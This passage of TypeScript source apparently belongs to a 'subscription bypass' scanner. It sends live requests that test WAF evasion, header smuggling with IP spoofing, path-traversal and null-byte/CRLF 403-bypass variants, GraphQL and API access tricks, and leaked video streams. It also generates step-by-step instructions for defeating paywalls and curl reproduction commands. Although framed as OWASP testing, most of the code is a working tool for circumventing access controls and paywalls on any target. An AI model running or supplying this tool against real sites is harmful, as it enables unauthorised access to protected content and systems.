            { name: "Fastly", check: () => !!wafHeaders["x-served-by"] || !!wafHeaders["x-fastly-request-id"] },
        ];

        const detectedWafs = wafSignatures.filter(w => w.check()).map(w => w.name);

        if (detectedWafs.length > 0) {
            emit("PROBE_9", `WAF(s) detected: ${detectedWafs.join(", ")}. Testing evasion techniques...`);

            // 9b. URL encoding bypass
            const encodingBypasses = generateEncodingBypasses(parsedUrl);
            for (const bypass of encodingBypasses) {
                try {
                    const resp = await fetchWithTimeout(bypass.url, {
                        headers: unauthHeaders,
                        redirect: "manual",
                    });
                    if (resp.status === 200 && (wafResp.status === 403 || baseline403)) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "WAF Bypass",
                            severity: "critical",
                            title: `${detectedWafs[0]} WAF Bypassed via ${bypass.technique}`,
                            description: `URL encoding technique '${bypass.technique}' bypasses the ${detectedWafs[0]} WAF, changing the response from 403 to 200.`,
                            bypass_method: bypass.technique,
                            evidence: `WAF: ${detectedWafs.join(", ")}. 403 → 200 via URL: ${bypass.url}`,
                            cvss_score: 9.1,
                            reproduction_steps: [
                                `Original URL (blocked): ${url}`,
                                `Bypass URL: ${bypass.url}`,
                                `Technique: ${bypass.technique}`,
                                `cURL: curl -v --path-as-is "${bypass.url}"`,
                            ]
                        });
                        emit("PROBE_9", `CRITICAL: WAF bypassed via ${bypass.technique}`);
                    }
                } catch { /* continue */ }
            }

            // 9c. Case variation bypass
            const caseVariants = [
                parsedUrl.pathname.toUpperCase(),
                parsedUrl.pathname.toLowerCase(),
                parsedUrl.pathname.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(""),
            ];
            for (const variant of caseVariants) {
                if (variant === parsedUrl.pathname) continue;
                try {
                    const resp = await fetchWithTimeout(`${parsedUrl.origin}${variant}${parsedUrl.search}`, {
                        headers: unauthHeaders,
                    });
                    if (resp.status === 200 && (wafResp.status === 403 || baseline403)) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "WAF Bypass",
                            severity: "high",
                            title: `WAF Bypassed via Case Variation`,
                            description: `Changing URL path case from '${parsedUrl.pathname}' to '${variant}' bypasses the WAF rule.`,
                            bypass_method: `URL case manipulation: ${variant}`,
                            evidence: `Original path blocked, case-varied path returns 200`,
                            cvss_score: 7.5,
                            reproduction_steps: [
                                `curl "${parsedUrl.origin}${variant}${parsedUrl.search}"`,
                            ]
                        });
                        emit("PROBE_9", `HIGH: WAF bypassed via case variation: ${variant}`);
                    }
                } catch { /* continue */ }
            }

            // 9d. Protocol-level bypass
            const protocolBypasses = [
                { url: url.replace("https://", "http://"), label: "HTTPS → HTTP downgrade" },
                { url: `${url}${url.includes("?") ? "&" : "?"}__cf_chl_jschl_tk__=bypass`, label: "CF challenge token injection" },
            ];
            for (const pb of protocolBypasses) {
                try {
                    const resp = await fetchWithTimeout(pb.url, {
                        headers: unauthHeaders,
                        redirect: "manual",
                    });
                    if (resp.status === 200 && (wafResp.status === 403 || baseline403)) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "WAF Bypass",
                            severity: "high",
                            title: `WAF Bypassed via ${pb.label}`,
                            description: `The technique '${pb.label}' bypasses the WAF protection.`,
                            bypass_method: pb.label,
                            evidence: `Blocked → 200 via ${pb.url}`,
                            cvss_score: 7.5,
                            reproduction_steps: [
                                `curl -v "${pb.url}"`,
                            ]
                        });
                        emit("PROBE_9", `HIGH: WAF bypassed via ${pb.label}`);
                    }
                } catch { /* continue */ }
            }
        } else {
            emit("PROBE_9", "No recognizable WAF fingerprint detected.");
        }
    } catch (err) {
        emit("PROBE_9", `WAF evasion probe failed: ${err}`);
    }

    emit("PROBE_9", "WAF detection & evasion probes complete.");

    // ═══════════════════════════════════════════════
    // PROBE 10: Client-Side Gatekeeper Detection
    // ═══════════════════════════════════════════════
    emit("PROBE_10", "Gatekeeper Detection — Identifying 3rd-party paywall providers and script gates...");

    try {
        const gateResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const html = await gateResp.text();

        const gatekeepers = [
            { name: "Piano.io / TinyPass", pattern: /tp\.tinypass\.com|piano\.io|tp\.main\.js/ },
            { name: "Poool", pattern: /poool\.module\.js|poool\.fr/ },
            { name: "Wallkit", pattern: /wallkit\.js|wallkit\.io/ },
            { name: "LaterPay", pattern: /laterpay\.net|lp-gate/ },
            { name: "Qiota", pattern: /qiota\.js|qiota\.com/ },
            { name: "Pelcro", pattern: /pelcro\.js|pelcro\.com/ },
            { name: "InPlayer", pattern: /inplayer\.com|inplayer\.js/ },
            { name: "Memberful", pattern: /memberful\.com|memberful\.js/ },
            { name: "Pico", pattern: /pico\.tools|pico\.js/ },
            { name: "Admiral", pattern: /admiral\.js|getadmiral\.com/ },
        ];

        for (const gate of gatekeepers) {
            if (gate.pattern.test(html)) {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "Gatekeeper Detection",
                    severity: "high",
                    title: `Paywall Provider Detected: ${gate.name}`,
                    description: `The site uses ${gate.name} to enforce the paywall. Bypassing this often involves blocking the script or spoofing its JSON response.`,
                    bypass_method: `Block script matching: ${gate.pattern.toString()}`,
                    evidence: `Script detected in HTML source. Local logic bypass likely possible.`,
                    cvss_score: 7.5,
                    reproduction_steps: [
                        `Open Browser Developer Tools (F12)`,
                        `Navigate to 'Network' tab`,
                        `Find script matching ${gate.name}`,
                        `Right-click -> 'Block Request URL'`,
                        `Refresh the page and check if content is unblocked`,
                    ]
                });
                emit("PROBE_10", `HIGH: Detected ${gate.name} paywall gatekeeper.`);
            }
        }

        // Detect JSON-LD or Embedded Config gates
        if (html.includes('"isFree": false') || html.includes('"isAccessibleForFree": "False"') || html.includes('"paywall": true')) {
            findings.push({
                id: `SB-${++findingCounter}`,
                probe_type: "Local Logic Bypass",
                severity: "high",
                title: "Client-Side Paywall State Found in JSON-LD",
                description: "The page contains structured data specifying that access is restricted. Modifying this object in memory or blocking the script that reads it may bypass the wall.",
                bypass_method: "Modify 'isAccessibleForFree' to 'True' in LocalStorage or memory",
                evidence: "Detected 'isAccessibleForFree': 'False' in page source",
                cvss_score: 7.1,
                reproduction_steps: [
                    "Locate the JSON-LD <script> block in source",
                    "Use a browser extension (e.g. Tampermonkey) to rewrite the object property",
                    "Verify if the UI gate is removed automatically",
                ]
            });
            emit("PROBE_10", "HIGH: Detected client-side access control flag in JSON-LD.");
        }

    } catch (err) {
        emit("PROBE_10", `Gatekeeper probe failed: ${err}`);
    }

    // ═══════════════════════════════════════════════
    // PROBE 11: Modern Architecture Bypass (GraphQL/API)
    // ═══════════════════════════════════════════════
    emit("PROBE_11", "Modern Architecture Bypass — Probing GraphQL and API endpoint leaks...");

    try {
        const apiResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const html = await apiResp.text();

        // Look for API endpoints in the source
        const apiPatterns = [
            /\/api\/v[0-9]\/[a-z-]+\/[0-9]+/g,
            /\/graphql/g,
            /https?:\/\/[a-z0-9.-]+\/v1\/content/g,
            /\"endpoint\":\s*\"([^\"]+)\"/g,
        ];

        const matchedEndpoints: string[] = [];
        for (const pattern of apiPatterns) {
            const matches = html.match(pattern);
            if (matches) matchedEndpoints.push(...matches);
        }

        if (matchedEndpoints.length > 0) {
            const uniqueApis = [...new Set(matchedEndpoints)];
            emit("PROBE_11", `Found ${uniqueApis.length} potential API/GraphQL endpoints. Testing for leaks...`);

            for (const api of uniqueApis.slice(0, 3)) { // Limit to top 3 to avoid noise
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "API Leak",
                    severity: "medium",
                    title: "Content API Endpoint Exposed",
                    description: "The application exposes a raw API endpoint that likely serves the content. Direct access to this endpoint might bypass the frontend paywall UI.",
                    bypass_method: `Request content directly from API: ${api}`,
                    evidence: `Found API reference in client-side source: ${api}`,
                    cvss_score: 5.0,
                    reproduction_steps: [
                        `Locate API call in Network tab`,
                        `Copy as cURL`,
                        `Remove Authorization headers and test if content is still returned`,
                    ]
                });
            }
        }

        // Specialized GraphQL check
        if (html.includes("graphql")) {
            findings.push({
                id: `SB-${++findingCounter}`,
                probe_type: "GraphQL Bypass",
                severity: "high",
                title: "GraphQL Access Control Vulnerability",
                description: "The site uses GraphQL for content delivery. Access controls are often incorrectly implemented at the query level rather than the schema level.",
                bypass_method: "Modify GraphQL query to remove 'is_premium' fields or add 'preview: false'",
                evidence: "GraphQL endpoint detected in source",
                cvss_score: 7.5,
                reproduction_steps: [
                    "Capture GraphQL request in DevTools",
                    "Change query variables: set 'subscribed' to true or 'tier' to 'premium'",
                    "Re-send query and observe full content return",
                ]
            });
            emit("PROBE_11", "HIGH: Potential GraphQL access control leak detected.");
        }
    } catch { /* continue */ }

    // ═══════════════════════════════════════════════
    // PROBE 12: Advanced Header Smuggling & Hop-by-Hop
    // ═══════════════════════════════════════════════
    emit("PROBE_12", "Advanced Header Smuggling — Testing Hop-by-Hop headers and proxy evasion...");

    const smugglingVariants: Array<{ headers: Record<string, string>; label: string }> = [
        { headers: { "Connection": "close, X-Forwarded-For", "X-Forwarded-For": "127.0.0.1" }, label: "Hop-by-Hop: X-Forwarded-For" },
        { headers: { "Connection": "Keep-Alive, Authorization" }, label: "Hop-by-Hop: Authorization clearing" },
        { headers: { "X-HTTP-Method-Override": "GET" }, label: "X-HTTP-Method-Override smuggling" },
        { headers: { "X-Forwarded-For": "127.0.0.1", "X-Original-IP": "127.0.0.1", "X-Real-IP": "127.0.0.1" }, label: "Triple IP Spoof" },
        { headers: { "Transfer-Encoding": "chunked", "X-Ignore": "x" }, label: "TE.CL Smuggling variant" },
    ];

    for (const variant of smugglingVariants) {
        try {
            const resp = await fetchWithTimeout(url, {
                headers: { ...unauthHeaders, ...variant.headers },
            });
            if (resp.status === 200 && baseline403) {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "Header Smuggling",
                    severity: "critical",
                    title: `Access Control Bypassed via ${variant.label}`,
                    description: `The technique '${variant.label}' successfully bypassed the server's access control, turning a 403 into a 200 OK.`,
                    bypass_method: `Header Smuggling: ${Object.entries(variant.headers).map(([k, v]) => `${k}: ${v}`).join(", ")}`,
                    evidence: `403 → 200 OK via smuggling technique`,
                    cvss_score: 9.3,
                    reproduction_steps: [
                        `curl -v ${Object.entries(variant.headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")} "${url}"`,
                    ]
                });
                emit("PROBE_12", `CRITICAL: Smuggling success via ${variant.label}`);
            }
        } catch { /* continue */ }
    }

    emit("PROBE_12", "Advanced smuggling probes complete.");

    // ═══════════════════════════════════════════════
    // PROBE 13: Heuristic Evolution Engine (The "Strike")
    // ═══════════════════════════════════════════════
    emit("PROBE_13", "Heuristic Evolution — Analyzing page structure for custom 'Strike' strategies...");

    try {
        const evoResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const html = await evoResp.text();

        const evolutionStrategies: string[] = [];

        // Strategy A: CSS Block
        if (html.includes("paywall") || html.includes("overlay") || html.includes("gate-container")) {
            evolutionStrategies.push("CSS Overlay Bypass: Use a browser extension to set 'display: none !important' on all elements containing 'paywall' or 'overlay' in their class/ID.");
        }

        // Strategy B: Blur Removal
        if (html.includes("filter: blur") || html.includes("blurred") || html.includes("blur-content")) {
            evolutionStrategies.push("Anti-Blur Strategy: Find the container with 'blur' styles and remove the CSS filter property to reveal text underlying the paywall.");
        }

        // Strategy C: Scroll Unlock
        if (html.includes("overflow: hidden") || html.includes("stop-scroll")) {
            evolutionStrategies.push("Scroll Liberation: The site disables scrolling. Force 'overflow: auto !important' on the <body> tag via UserScript.");
        }

        // Strategy D: Data Recovery (The "Strike")
        if (evolutionStrategies.length > 0) {
            findings.push({
                id: `SB-STRYKE`,
                probe_type: "Evolutionary Strategy",
                severity: "high",
                title: "Custom 'Strike' Bypass Strategy Generated",
                description: "The Evolution Engine analyzed the page structure and identified multiple local-logic flaws that can be combined for a full bypass.",
                bypass_method: "Multi-layered Local Logic Evasion",
                evidence: `Heuristic matches: ${evolutionStrategies.length} patterns found.`,
                cvss_score: 8.5,
                reproduction_steps: [
                    ...evolutionStrategies,
                    "Verify if combining these steps yields full content access.",
                ]
            });
            emit("PROBE_13", "HIGH: Custom evolutionary bypass strategy generated.");
        }
    } catch { /* continue */ }

    emit("PROBE_13", "Evolution engine analysis complete.");

    // ═══════════════════════════════════════════════
    // PROBE 14: Video Paywall Analysis ('The Strike')
    // ═══════════════════════════════════════════════
    emit("PROBE_14", "Video Paywall Analysis — Searching for leaked media streams and hidden player configs...");

    try {
        const videoResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const html = await videoResp.text();

        // Look for common video stream patterns leaked in source
        const videoPatterns = [
            { name: "HLS Playlist Leak (.m3u8)", regex: /https?:\/\/[a-z0-9.-]+\/[^"']+\.m3u8[?a-z0-9=%.-]*/gi },
            { name: "MPEG-DASH Leak (.mpd)", regex: /https?:\/\/[a-z0-9.-]+\/[^"']+\.mpd[?a-z0-9=%.-]*/gi },
            { name: "Direct Video URL (.mp4)", regex: /https?:\/\/[a-z0-9.-]+\/[^"']+\.mp4[?a-z0-9=%.-]*/gi },
            { name: "JWPlayer Config Leak", regex: /jwplayer\(".*"\)\.setup\((\{.*\})\)/g },
            { name: "Vimeo Config Leak", regex: /vimeo\.com\/video\/[0-9]+\/config/g },
        ];

        for (const pattern of videoPatterns) {
            const matches = html.match(pattern.regex);
            if (matches) {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "Video Paywall Bypass",
                    severity: "critical",
                    title: `Leaked Video Stream Found: ${pattern.name}`,
                    description: `The raw video stream URL was found leaked in the page source. This allows direct access to the full video content, bypassing the subscription requirement.`,
                    bypass_method: `Access raw stream directly: ${matches[0].substring(0, 50)}...`,
                    evidence: `Found matching pattern '${pattern.name}' in HTML source.`,
                    cvss_score: 9.8,
                    reproduction_steps: [
                        `Locate the stream URL in source: ${matches[0]}`,
                        `Open the URL in a standalone player (e.g. VLC or Chrome directly)`,
                        `Confirm the full video plays without a subscription`,
                    ]
                });
                emit("PROBE_14", `CRITICAL: Leaked ${pattern.name} found!`);
            }
        }
    } catch { /* continue */ }

    emit("PROBE_14", "Video paywall analysis complete.");

    // ═══════════════════════════════════════════════
    // GENERATE PoC REPORT
    // ═══════════════════════════════════════════════
    emit("REPORT", `Scan complete. ${findings.length} finding(s) identified.`);

    let pocReport: PoCReport | null = null;

    if (findings.length > 0) {
        pocReport = {
            target: url,
            vulnerability_class: "OWASP A01:2021 — Broken Access Control (Subscription Bypass)",
            owasp_category: "A01:2021",
            total_findings: findings.length,
            critical_count: findings.filter(f => f.severity === "critical").length,
            high_count: findings.filter(f => f.severity === "high").length,
            findings: findings,
            generated_at: new Date().toISOString(),
        };
        emit("REPORT", `PoC report generated: ${pocReport.critical_count} critical, ${pocReport.high_count} high severity`);
    } else {
        emit("REPORT", "No subscription bypass vulnerabilities detected. Access controls appear to be enforced server-side.");
    }

    return {
        status: "success",
        target_url: url,
        findings,
        poc_report: pocReport,
        message: `Subscription bypass scan complete. ${findings.length} finding(s).`,
    };
}

// ═══════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════

async function fetchWithTimeout(url: string, opts: RequestInit & { timeout?: number } = {}): Promise<Response> {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), opts.timeout || 10000);
    try {
        return await fetch(url, { ...opts, signal: controller.signal, redirect: "follow" });
    } finally {
        clearTimeout(timeout);
    }
}

function calculateSimilarity(a: string, b: string): number {
    if (a.length === 0 && b.length === 0) return 1;
    if (a.length === 0 || b.length === 0) return 0;
    // Quick length-based similarity + content overlap
    const lenRatio = Math.min(a.length, b.length) / Math.max(a.length, b.length);
    // Sample-based comparison for performance
    const sampleSize = Math.min(500, Math.min(a.length, b.length));
    let matches = 0;
    for (let i = 0; i < sampleSize; i++) {
        const idx = Math.floor((i / sampleSize) * Math.min(a.length, b.length));
        if (a[idx] === b[idx]) matches++;
    }
    return (lenRatio * 0.4) + ((matches / sampleSize) * 0.6);
}

function containsPaidIndicators(body: string): boolean {
    const lower = body.toLowerCase();
    const indicators = [
        "download", "premium", "full access", "subscription",
        "purchased", "your file", "content-disposition",
        "application/pdf", "application/octet-stream",
        "video/mp4", "audio/mpeg",
    ];
    return indicators.some(i => lower.includes(i)) && body.length > 500;
}

function generatePathVariants(url: URL): string[] {
    const variants: string[] = [];
    const segments = url.pathname.split("/").filter(Boolean);

    // Try direct /download, /raw, /view, /embed variants
    const suffixes = ["/download", "/raw", "/view", "/embed", "/export", "/print", "/api"];
    for (const suffix of suffixes) {
        variants.push(`${url.origin}${url.pathname}${suffix}`);
    }

    // Strip last segment (might be paywall wrapper)
    if (segments.length > 1) {
        segments.pop();
        variants.push(`${url.origin}/${segments.join("/")}`);
    }

    return variants.slice(0, 15);
}

function extractContentId(url: URL): string | null {
    // Extract potential content IDs from URL paths and params
    const pathMatch = url.pathname.match(/[\/\-]([a-zA-Z0-9]{6,})\/?$/);
    if (pathMatch) return pathMatch[1];

    // Check query params
    for (const [key, val] of url.searchParams.entries()) {
        if (["id", "content_id", "file_id", "doc_id", "asset"].includes(key)) return val;
    }
    return null;
}

function generateIdorVariants(contentId: string, url: URL): Array<{ url: string; mutatedId: string }> {
    const variants: Array<{ url: string; mutatedId: string }> = [];

    // Numeric IDOR
    const numericPart = contentId.match(/\d+/);
    if (numericPart) {
        const num = parseInt(numericPart[0]);
        for (const offset of [1, -1, 2, -2, 100]) {
            const mutated = contentId.replace(numericPart[0], (num + offset).toString());
            variants.push({
                url: url.toString().replace(contentId, mutated),
                mutatedId: mutated,
            });
        }
    }

    return variants.slice(0, 5);
}

function extractApiEndpoints(html: string): string[] {
    const endpoints: string[] = [];
    // Match API URLs in JavaScript/HTML
    const patterns = [
        /["'](\/api\/v?\d*\/[^"'\s]+)["']/g,
        /["'](https?:\/\/[^"'\s]*\/api\/[^"'\s]+)["']/g,
        /fetch\(["']([^"']+)["']/g,
        /axios\.\w+\(["']([^"']+)["']/g,
    ];
    for (const pattern of patterns) {
        let match;
        while ((match = pattern.exec(html)) !== null) {
            if (match[1] && !endpoints.includes(match[1])) {
                endpoints.push(match[1]);
            }
        }
    }
    return endpoints;
}

function looksLikeJson(text: string): boolean {
    const trimmed = text.trim();
    return (trimmed.startsWith("{") && trimmed.endsWith("}")) ||
        (trimmed.startsWith("[") && trimmed.endsWith("]"));
}

/**
 * Generate 403 path bypass URL variants.
 * 30+ techniques based on common access control misconfigurations.
 */
function generate403PathBypasses(url: URL): Array<{ url: string; technique: string }> {
    const path = url.pathname;
    const origin = url.origin;
    const search = url.search;
    const variants: Array<{ url: string; technique: string }> = [];

    // Trailing slash manipulation
    if (path.endsWith("/")) {
        variants.push({ url: `${origin}${path.slice(0, -1)}${search}`, technique: "Remove trailing slash" });
    } else {
        variants.push({ url: `${origin}${path}/${search}`, technique: "Add trailing slash" });
    }

    // Double slash
    variants.push({ url: `${origin}//${path}${search}`, technique: "Double leading slash //" });

    // Path traversal with backtrack
    variants.push({ url: `${origin}${path}/..;/${path}${search}`, technique: "Path traversal: /..;/" });
    variants.push({ url: `${origin}/.;${path}${search}`, technique: "Semicolon path injection: /.;" });
    variants.push({ url: `${origin}${path}..;/`, technique: "Semicolon backtrack: ..;/" });

    // Dot segments
    variants.push({ url: `${origin}${path}/.${search}`, technique: "Trailing dot: /path/." });
    variants.push({ url: `${origin}${path}..${search}`, technique: "Double dot segment" });
    variants.push({ url: `${origin}${path}/.//${search}`, technique: "Dot-slash-slash: /.//path" });

    // URL encoding variations  
    variants.push({
        url: `${origin}${path.split("/").map(s => s ? encodeURIComponent(s) : "").join("/")}${search}`,
        technique: "URL encode path segments"
    });

    // Double URL encoding
    variants.push({
        url: `${origin}${path.replace(/\//g, "%252f")}${search}`,
        technique: "Double URL encode slashes (%252f)"
    });

    // Unicode/UTF-8 encoding
    variants.push({ url: `${origin}${path.replace(/\//g, "%ef%bc%8f")}${search}`, technique: "Unicode fullwidth slash (／)" });

    // Null byte injection
    variants.push({ url: `${origin}${path}%00${search}`, technique: "Null byte injection (%00)" });
    variants.push({ url: `${origin}${path}%00.json${search}`, technique: "Null byte + .json extension" });
    variants.push({ url: `${origin}${path}%00.html${search}`, technique: "Null byte + .html extension" });

    // Tab/newline injection
    variants.push({ url: `${origin}${path}%09${search}`, technique: "Tab character injection (%09)" });
    variants.push({ url: `${origin}${path}%0a${search}`, technique: "Newline injection (%0a)" });
    variants.push({ url: `${origin}${path}%0d%0a${search}`, technique: "CRLF injection (%0d%0a)" });

    // Extension append
    variants.push({ url: `${origin}${path}.json${search}`, technique: "Append .json extension" });
    variants.push({ url: `${origin}${path}.html${search}`, technique: "Append .html extension" });
    variants.push({ url: `${origin}${path}.php${search}`, technique: "Append .php extension" });
    variants.push({ url: `${origin}${path}.xml${search}`, technique: "Append .xml extension" });
    variants.push({ url: `${origin}${path}.txt${search}`, technique: "Append .txt extension" });

    // Wildcard/glob
    variants.push({ url: `${origin}${path}*${search}`, technique: "Wildcard append (*)" });

    // Fragment injection
    variants.push({ url: `${origin}${path}#${search}`, technique: "Fragment injection (#)" });

    // Tilde (home directory traversal)
    variants.push({ url: `${origin}/~/${path.slice(1)}${search}`, technique: "Tilde home directory prefix ~/..." });

    // Case swapping of last segment
    const segments = path.split("/");
    if (segments.length > 1) {
        const last = segments[segments.length - 1];
        if (last) {
            segments[segments.length - 1] = last.charAt(0).toUpperCase() + last.slice(1);
            variants.push({ url: `${origin}${segments.join("/")}${search}`, technique: "Capitalize first char of last path segment" });
        }
    }

    // Semicolon injection (Tomcat/Java-specific)
    variants.push({ url: `${origin}${path};${search}`, technique: "Semicolon append (Tomcat bypass)" });
    variants.push({ url: `${origin}${path};.css${search}`, technique: "Semicolon + .css (static resource bypass)" });
    variants.push({ url: `${origin}${path};.js${search}`, technique: "Semicolon + .js (static resource bypass)" });

    return variants;
}

/**
 * Generate URL encoding bypass variants for WAF evasion.
 */
function generateEncodingBypasses(url: URL): Array<{ url: string; technique: string }> {
    const path = url.pathname;
    const origin = url.origin;
    const search = url.search;
    const variants: Array<{ url: string; technique: string }> = [];

    // Standard URL encoding
    variants.push({
        url: `${origin}${encodeURI(path)}${search}`,
        technique: "Standard URL encoding (encodeURI)"
    });

    // Double URL encoding
    variants.push({
        url: `${origin}${encodeURI(encodeURI(path))}${search}`,
        technique: "Double URL encoding"
    });

    // Replace slashes with encoded variants
    variants.push({
        url: `${origin}${path.replace(/\//g, "%2f")}${search}`,
        technique: "Encode forward slashes (%2f)"
    });

    // Unicode normalization bypass
    variants.push({
        url: `${origin}${path.replace(/\//g, "\uff0f")}${search}`,
        technique: "Unicode fullwidth slash normalization (／)"
    });

    // Overlong UTF-8 encoding
    variants.push({
        url: `${origin}${path.replace(/\//g, "%c0%af")}${search}`,
        technique: "Overlong UTF-8 slash (%c0%af)"
    });

    variants.push({
        url: `${origin}${path.replace(/\//g, "%e0%80%af")}${search}`,
        technique: "Overlong UTF-8 3-byte slash (%e0%80%af)"
    });

    // Mixed encoding
    variants.push({
        url: `${origin}${path.split("/").map((seg, i) => i % 2 === 0 ? seg : encodeURIComponent(seg)).join("/")}${search}`,
        technique: "Alternating segment encoding"
    });

    // Backslash substitution (IIS)
    variants.push({
        url: `${origin}${path.replace(/\//g, "\\")}${search}`,
        technique: "Backslash substitution (IIS)"
    });

    return variants;
}
